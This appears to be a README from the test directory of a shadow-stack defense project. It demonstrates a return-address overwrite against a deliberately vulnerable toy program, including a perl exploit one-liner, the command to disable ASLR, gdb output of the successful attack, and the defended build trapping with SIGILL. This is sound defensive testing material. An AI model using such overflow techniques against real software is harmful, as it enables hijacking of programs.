This directory contains a vulnerable program, vuln.c, with a buffer overrun.
The attacker's goal is to use the buffer overrun to overwrite the instruction
pointer and execute the function attacker_target. To build, run

$ make

Let's first consider how you would exploit this program without the address
randomization of ASLR. You can disable ASLR with

$ setarch `uname -m` -R /bin/bash

but a simpler approach is to run programs within gdb, which will disable ASLR.
We can see that, on this system, the target is always at 0x5555555547da. Hence
we can generate an exploit like so. The buffer is 64 bytes, followed by an
8-byte base pointer, followed by the 8-byte return address.

$ perl -e 'print "A"x(64+8) . "\xda\x47\x55\x55\x55\x55\x00\x00"' > vuln.gdb.in
$ gdb -q ./vuln
Reading symbols from ./vuln...(no debugging symbols found)...done.
(gdb) run < vuln.gdb.in
Starting program: /home/egalito/egalito-shadow-stack-app/test/vuln < vuln.gdb.in
buf is at 0x7fffffffe370, target is at 0x5555555547da

buf: [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUUUU]
successful exploit! congratulations.
[Inferior 1 (process 12925) exited with code 01]
(gdb) q

You can also use the script vuln.pl, which works for any target address. It
parses the address and generates an exploit at run time.

$ perl vuln.pl ./vuln
spawn child process {./vuln}
child wrote {buf is at 0x7ffe9019bd80, target is at 0x5618f14517da}
exploit is {AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEV}
child process output {}
child process output {buf: [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEV]}
child process output {successful exploit! congratulations.}
child exited with status 1

This works even on a binary transformed with Egalito. (It also works even if
you add padding, rearrange functions, etc.) Note the different addresses of
attacker_target.

Finally, if you have built the shadow stack app, you can use it to defend vuln.

Notice the exit signal 4, SIGILL, because we intentionally executed an ud2
undefined instruction after the stack integrity violation. You can see this by
examining the core dump in gdb:

$ ulimit -c unlimited
$ perl vuln.pl ./vuln.ss
spawn child process {./vuln.ss}
child wrote {buf is at 0x7ffdf95a63e0, target is at 0x4000024c}

Congratulations, that is an indication of a successful defense.
